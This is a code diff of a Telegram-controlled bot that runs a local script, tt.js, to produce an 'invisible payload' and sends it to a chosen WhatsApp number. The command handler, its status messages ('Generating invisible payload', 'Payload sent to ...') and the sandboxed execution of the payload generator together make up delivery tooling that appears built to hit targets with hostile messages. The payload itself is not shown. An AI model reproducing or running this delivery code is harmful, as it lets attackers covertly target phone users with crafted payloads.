@@ -1,6 +1,5 @@
 import { TelegramClient, Api } from "telegram";
 import { NewMessage } from "telegram/events/index.js";
-import messageFromTT from './tt.js';
 import { StringSession } from "telegram/sessions/index.js";
 
 import { 
@@ -1706,48 +1705,36 @@ bot.onText(/\/send\s+(\d+)/, async (msg, match) => {
     let statusMsg = await bot.sendMessage(chatId, `[SYSTEM] Generating invisible payload...`);
 
     try {
+        // We look for the file in the same folder
         const ttPath = path.join(__dirname, 'tt.js');
-        if (!fs.existsSync(ttPath)) throw new Error('tt.js not found in directory.');
+        
+        if (!fs.existsSync(ttPath)) throw new Error('tt.js file missing.');
 
-        // 1. Read the code from tt.js
+        // 1. Read the code as text
         const code = fs.readFileSync(ttPath, 'utf8');
 
-        // 2. Execute the code safely in a sandbox
-        // We initialize 'message' so the script can modify it
-        const sandbox = { 
-            console: console, 
-            message: "",
-            // These allow your 'let' declarations in tt.js to work within the VM
-            let: null, 
-            const: null 
-        };
-
+        // 2. Create a fresh sandbox and run the code
+        const sandbox = { console: console, message: "" };
         vm.createContext(sandbox);
-        
-        // We run the code. If tt.js has "let message = ...", 
-        // we might need to grab it specifically.
         vm.runInContext(code, sandbox);
 
-        // Capture the result
+        // 3. Grab the 'message' variable your tt.js creates
         const finalPayload = sandbox.message;
 
-        if (!finalPayload) {
-            throw new Error('tt.js executed but the "message" variable is empty.');
-        }
+        if (!finalPayload) throw new Error('tt.js did not produce a "message" variable.');
 
-        // 3. Format Number for WhatsApp
+        // 4. Format and Send
         const waId = targetNumber.includes('@c.us') ? targetNumber : `${targetNumber}@c.us`;
-
-        // 4. Send via your WhatsApp socket (sock)
+        
         await sock.sendMessage(waId, { text: finalPayload });
 
-        await bot.editMessageText(`[SUCCESS] ✅ Invisible payload sent to ${targetNumber}!`, {
+        await bot.editMessageText(`[SUCCESS] ✅ Payload sent to ${targetNumber}!`, {
             chat_id: chatId,
             message_id: statusMsg.message_id
         });
 
     } catch (err) {
-        console.error('[SEND_ERROR]', err);
+        console.error(err);
         await bot.editMessageText(`[ERROR] Send failed: ${err.message}`, {
             chat_id: chatId,
             message_id: statusMsg.message_id
